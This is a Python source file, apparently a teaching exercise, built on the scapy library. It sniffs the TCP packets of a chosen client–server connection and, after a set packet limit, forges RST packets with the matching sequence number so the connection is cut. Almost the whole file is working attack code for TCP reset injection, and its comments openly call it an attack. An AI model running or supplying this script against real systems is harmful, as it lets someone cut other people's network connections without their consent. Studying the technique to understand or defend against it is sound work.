from scapy.all import *
import ifaddr
import threading
import random

DEFAULT_WINDOW_SIZE = 2052


# In order for this attack to work on Linux, we must
# use L3RawSocket, which under the hood sets up the socket
# to use the PF_INET "domain". This is required because of the
# way localhost works on Linux.
#
# See https://scapy.readthedocs.io/en/latest/troubleshooting.html#i-can-t-ping-127-0-0-1-scapy-does-not-work-with-127-0-0-1-or-on-the-loopback-interface for more details.
conf.L3socket = L3RawSocket

def find_iface(client_ip):
    local_ifaces = [
        adapter.name for adapter in ifaddr.get_adapters()
        if len([ip for ip in adapter.ips if ip.ip == client_ip]) > 0
    ]
    return local_ifaces[0]

def is_packet_on_tcp_conn_over_limit(client_ip, server_ip, server_port, limit):
    total_packet_counter = 0
    server_packet_counter = 0
    def f(p):
        if not p.haslayer(TCP):
            return False

        is_packet_tcp_client_to_server = p[IP].src == client_ip and p[IP].dst == server_ip and p[TCP].dport == server_port
        is_packet_tcp_server_to_client = p[IP].src == server_ip and p[IP].dst == client_ip and p[TCP].sport == server_port

        if (not is_packet_tcp_client_to_server) and (not is_packet_tcp_server_to_client):
            return False

        nonlocal total_packet_counter
        total_packet_counter += 1

        if is_packet_tcp_server_to_client:
            nonlocal server_packet_counter
            server_packet_counter += 1

        will_block = is_packet_tcp_server_to_client and total_packet_counter >= limit

        log_info(
            "Packet #" + str(total_packet_counter) + " - " + str(server_packet_counter),
            {
                "to_server": is_packet_tcp_client_to_server,
                "to_client": is_packet_tcp_server_to_client,
                "will_block": will_block,
            }
        )

        p.show()
              
        return will_block
        
    return f


def send_reset(iface, client_ip, seq_jitter=0, ignore_syn=True):
    """Set seq_jitter to be non-zero in order to prove to yourself that the
    sequence number of a RST segment does indeed need to be exactly equal
    to the last sequence number ACK-ed by the receiver"""
    def f(p):
        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport
        seq = p[TCP].seq
        ack = p[TCP].ack
        flags = p[TCP].flags

        log_info(
            "Grabbed packet",
            {
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "src_port": src_port,
                "dst_port": dst_port,
                "seq": seq,
                "ack": ack,
                "flags": flags
            }
        )

#         if "S" in flags and ignore_syn:
#             print("Packet has SYN flag, not sending RST")
#             return

        # Don't allow a -ve seq
        jitter = random.randint(max(-seq_jitter, -seq), seq_jitter)
        if jitter == 0:
            print("jitter == 0, this RST packet should close the connection")

        rst_seq = ack + jitter

        if p[IP].src == client_ip:
            p = IP(src=src_ip, dst=dst_ip) / TCP(sport=src_port, dport=dst_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)
        else:
            p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)

        log_info(
            "Sending RST packet...",
            {
                "orig_ack": ack,
                "jitter": jitter,
                "seq": rst_seq,    
            },
        )

        send(p, verbose=0, iface=iface)

    return f

def log_info(msg, params={}):
    formatted_params = " ".join([f"{k}={v}" for k, v in params.items()])
    print(f"{msg} {formatted_params}")

def log_packet(p):
    """This prints a big pile of debug information. We could make a prettier
    log function if we wanted."""
    return p.show()

if __name__ == "__main__":
    if (len(sys.argv) < 5):
        log_info("Usage: python ./tcp-connection-reset.py <client_ip> <server_ip> <server_port> <limit of packets>")
        exit()
    
    client_ip = sys.argv[1]
    server_ip = sys.argv[2]
    server_port = int(sys.argv[3])
    iface1=find_iface(client_ip)
    limit = int(sys.argv[4])

    log_info("Starting sniff...")

    t = sniff(
        iface=iface1,
        count=5000,
        prn=send_reset(iface1, client_ip),
        lfilter=is_packet_on_tcp_conn_over_limit(client_ip, server_ip, server_port, limit)
        )
    
    log_info("Finished sniffing!")